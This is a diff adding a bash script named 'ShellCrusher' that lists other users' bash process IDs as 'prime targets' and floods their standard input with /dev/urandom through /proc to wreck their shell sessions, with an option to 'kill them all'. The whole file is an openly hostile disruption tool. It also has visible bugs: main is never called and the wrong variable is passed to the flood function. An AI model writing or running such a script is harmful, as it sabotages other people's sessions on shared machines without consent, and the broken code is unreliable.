@@ -1,0 +1,79 @@
+#!/bin/bash
+
+
+
+showTargets ()
+
+{
+        
+	for target in $(ps -C bash -o pid | grep -v "$(echo $$)" | grep -v "$(ps -o ppid)" | grep -v "PID")
+
+        do
+                
+		echo $target
+
+        done
+
+}
+
+
+
+flood ()
+
+{
+	
+	for target in $1
+
+	do
+		
+		echo "Flooding [$target]"
+
+
+		dir="/proc/$(echo $target)/fd/0"
+
+		if [ ! -L "$dir" ]
+
+		then
+
+			echo -e "$target has been succesfully terminated"
+
+			exit
+
+		fi
+
+		cat /dev/urandom > $dir 2>/dev/null
+
+	done	
+
+}
+main ()
+
+{
+	echo -e "Welcome to ShellCrusher\n\n"
+	
+	echo -e "Might I suggest some prime targets:\n "
+
+	showTargets
+ 
+
+	read -p "Please select a target, or -1 to kill them all:   " -i "-1" target
+
+
+	if [ "$target" == "-1" ]
+
+	then
+
+		targets=$(ps -C bash -o pid | grep -v "$(echo $$)" | grep -v "$(ps -o ppid)" | grep -v "PID")
+
+	else
+
+		targets=$target
+
+	fi
+
+
+	
+	flood $target
+
+}
+
